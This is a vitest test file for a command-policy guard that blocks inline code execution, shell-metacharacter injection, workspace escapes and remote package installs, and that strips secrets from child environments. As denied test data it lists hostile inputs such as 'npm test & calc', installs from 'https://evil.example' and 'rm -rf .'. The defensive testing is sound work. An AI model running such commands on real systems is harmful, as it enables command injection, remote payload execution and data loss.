import { describe, expect, it } from 'vitest';
import { evaluateCommand, sanitizedChildEnv } from './command-policy';

function denied(command: string, args: string[]) {
  const res = evaluateCommand(command, args, 'win32');
  expect(res.ok, `${command} ${args.join(' ')} seharusnya ditolak`).toBe(false);
}

describe('security/command-policy', () => {
  it('menolak eksekusi kode inline lewat interpreter', () => {
    denied('node', ['-e', 'process.exit(1)']);
    denied('node', ['--eval=1']);
    denied('node', ['-r', 'evil', 'app.js']);
    denied('node', ['--import', 'evil.mjs', 'app.js']);
    denied('node', ['--inspect=0', 'app.js']);
    denied('python', ['-c', 'print(1)']);
    denied('python', ['-m', 'pip', 'install', 'x']);
    denied('npx', ['-c', 'calc']);
    denied('npx', ['-y', 'evil-package']);
    denied('npx', ['--package=evil', 'x']);
    denied('npm', ['exec', 'evil']);
    denied('npm', ['x', 'evil']);
  });

  it('menolak metakarakter shell (injeksi cmd.exe saat shell: true)', () => {
    denied('npm', ['test', '&', 'calc']);
    denied('npm', ['run', 'build&calc']);
    denied('npx', ['vite', '|', 'whoami']);
    denied('npm', ['run', '%PATH%']);
    denied('npm', ['run', 'a^b']);
    denied('npm', ['run', 'two words']);
    denied('npm', ['run', '"quoted"']);
  });

  it('menolak path keluar workspace dan sumber paket remote', () => {
    denied('node', ['../../apps/server/src/index.ts']);
    denied('node', ['C:/Windows/System32/x.js']);
    denied('tsc', ['--outDir=../../evil']);
    denied('npm', ['install', '~/evil']);
    denied('npm', ['install', 'github:evil/pkg']);
    denied('npm', ['install', 'https://evil.example/pkg.tgz']);
    denied('npm', ['install', '--registry=https://evil.example']);
    denied('npm', ['install', '-g', 'x']);
  });

  it('git hanya subperintah baca', () => {
    denied('git', ['push', 'origin', 'main']);
    denied('git', ['commit', '-m', 'x']);
    denied('git', ['-c', 'core.sshCommand=calc', 'status']);
    denied('git', ['diff', '--output=x.txt']);
    denied('git', ['branch', 'hapus-main']);
    expect(evaluateCommand('git', ['status', '--short'], 'win32').ok).toBe(true);
    expect(evaluateCommand('git', ['branch', '--show-current'], 'win32').ok).toBe(true);
  });

  it('mengizinkan perintah kerja normal dan memaksa npx tanpa unduhan', () => {
    const npmTest = evaluateCommand('npm', ['test'], 'win32');
    expect(npmTest).toMatchObject({ ok: true, useShell: true });

    const npx = evaluateCommand('npx', ['playwright', 'test', 'tests/visual.spec.ts'], 'win32');
    expect(npx.ok && npx.args).toEqual(['--no', 'playwright', 'test', 'tests/visual.spec.ts']);

    const node = evaluateCommand('node', ['scripts/build.js', '--mode=prod'], 'win32');
    expect(node).toMatchObject({ ok: true, useShell: false });

    expect(evaluateCommand('npm', ['install', '@types/node'], 'linux')).toMatchObject({ ok: true, useShell: false });
    expect(evaluateCommand('python', ['-m', 'pytest', 'tests'], 'win32').ok).toBe(true);
    expect(evaluateCommand('rm', ['-rf', '.'], 'win32').ok).toBe(false);
  });

  it('membuang rahasia dari environment proses anak', () => {
    const env = sanitizedChildEnv(
      {
        PATH: '/usr/bin',
        SystemRoot: 'C:\\Windows',
        NINEROUTER_KEY: 'sk-rahasia',
        OFFICE_TOKEN: 'rahasia',
        GITHUB_TOKEN: 'ghp_x',
        AWS_SECRET_ACCESS_KEY: 'x',
        CUSTOM_GATEWAY: 'x',
      },
      ['CUSTOM_GATEWAY'],
    );
    expect(env).toEqual({ PATH: '/usr/bin', SystemRoot: 'C:\\Windows' });
  });
});
